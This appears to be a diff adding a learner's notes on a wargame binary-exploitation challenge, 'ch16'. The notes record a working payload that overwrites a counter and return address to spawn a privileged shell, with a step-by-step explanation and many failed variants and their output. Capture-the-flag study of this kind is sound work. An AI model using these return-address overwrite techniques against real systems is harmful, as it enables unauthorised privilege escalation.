@@ -1,0 +1,68 @@
+
+
+Why does this work?
+===================
+
+(python -c 'print "\x08"*4 + "\xbc\xfa\xff\xbf"';cat) | ./ch16
+*Success*
+-------------------------------------------------------------------------------
+1. () - Run commands sequentially, if ran parallel, 'cat' will run in original
+	unpriviliged shell. Rather than in shell("/bin/bash")
+2. terminal, and not cracked.
+3. "\x08" - subtracts 1 byte from int count. (count--)
+4. "\x08" * 4  - Subtract 16 bytes in total
+5. "\xbc\xfa\xff\xbf" - replace subtracted bytes with shell() ret addr.
+6. () - Now cat is ran AFTER python command. Outputs commands.
+7. | - pipe into ./ch16
+8. ./ch16
+
+-------------------------------------------------------------------------------
+
+
+
+
+Why do these fail?
+==================
+
+(python -c 'print "\x08"*4 + "\xbc\xfa\xff\xbf"';python -c 'import pty;pty.spawn\("/bin/bash"\)') | ./ch16
+Enter your name:   File "<string>", line 1
+    import pty;pty.spawn\("/bin/bash"\)
+                                      ^
+SyntaxError: unexpected character after line continuation character
+
+
+(python -c 'print "\x08"*4 + "\xbc\xfa\xff\xbf"';python -c 'import pty;pty.spawn("/bin/bash")') | ./ch16 
+Enter your name: /bin/dash: 2: app-systeme-ch16@challenge02:~$: not found
+                                                                         /bin/dash: 3: Syntax error: "(" unexpected
+
+
+(python -c 'print "\x08"*4 + "\xbc\xfa\xff\xbf"';echo) | ./ch16
+Doesn't run a shell
+
+Shell but no output
+(python -c 'print "\x08"*4 + "\xbc\xfa\xff\xbf"'; tail -) | ./ch16
+
+python -c 'print "\x08"*4 + "\xbc\xfa\xff\xbf"';cat | ./ch16 
+-bash: syntax error near unexpected token `|'
+
+without '()' python && cat will not be executed to give 1 output, it will
+tell bash to execute python THEN execute cat command, giving two outputs
+instead of 1
+
+
+(python -c 'print "\x08"*4 + "\xbc\xfa\xff\xbf"';/bin/bash -p python -c 'import pty;pty.spawn("/bin/bash")') | ./ch16
+Enter your name: /usr/bin/python: /usr/bin/python: cannot execute binary file
+
+
+(python -c 'print "\x08"*4 + "\xbc\xfa\xff\xbf"';/bin/bash -p) | ./ch16
+Enter your name: app-systeme-ch16@challenge02:~$ id
+/bin/dash: 2: Syntax error: "(" unexpected
+
+(python -c 'print "\x08"*4 + "\xbc\xfa\xff\xbf"';/bin/bash -ip) | ./ch16
+
+(python -c 'print "\x08"*4 + "\xbc\xfa\xff\xbf"';/bin/bash > /tmp/cmds.txt | tail -f -) | ./ch16
+
+(python -c 'print "\x08"*4 + "\xbc\xfa\xff\xbf"';/bin/bash > /tmp/cmds.txt;tail -f /tmp/cmds.txt) | ./ch16
+
+python -c 'print "\x90" * 10 + "\xbc\xfa"' && ls| ./ch16 | more
+
